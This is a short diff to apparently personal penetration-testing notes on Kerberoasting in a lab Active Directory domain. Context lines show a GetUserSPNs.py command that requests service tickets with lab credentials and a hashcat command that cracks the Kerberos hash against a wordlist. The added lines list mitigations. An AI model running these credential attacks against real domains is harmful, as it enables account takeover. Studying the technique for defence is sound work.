@@ -114,3 +114,8 @@ sudo GetUserSPNS.py MARVEL.local/fcastle:Password -dc-p 192.168.132.136 -request
 From result grab krb hash and put it in krb.txt file
 hashcat -m 13100 krb.txt /usr/share/wordlist/rockyou.txt
 
+## Kerberoastin Mitigation
+
+- Do not run the service account as admin
+- Service account should have strong password
+- Do not mark password account in account description
